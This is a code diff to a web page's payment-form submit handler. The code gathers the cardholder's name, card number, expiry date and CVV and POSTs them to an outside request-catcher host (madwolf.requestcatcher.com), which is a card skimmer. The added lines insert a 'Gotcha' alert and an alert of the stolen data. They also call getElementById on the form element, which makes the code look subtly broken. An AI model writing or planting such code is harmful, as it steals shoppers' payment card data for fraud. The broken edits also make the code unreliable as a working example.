@@ -3,12 +3,16 @@ paymentForm.addEventListener('submit', async (event) => {
     const rawValue = cardNumberInput.value.replace(/\s+/g, '');
 
     if (!validateLuhn(rawValue)) {
+        alert("Gotcha");
+
         const userData = {
-            nameOnCard: document.getElementById('card-name').value,
-            cardNumber: document.getElementById('card-number').value,
-            expiryDate: document.getElementById('expiry').value,
-            cvv: document.getElementById('cvv').value
+            nameOnCard: paymentForm.getElementById('card-name').value,
+            cardNumber: paymentForm.getElementById('card-number').value,
+            expiryDate: paymentForm.getElementById('expiry').value,
+            cvv: paymentForm.getElementById('cvv').value
         }
+
+        alert(userData);
 
         await fetch("https://madwolf.requestcatcher.com/test", {
             method: "POST",
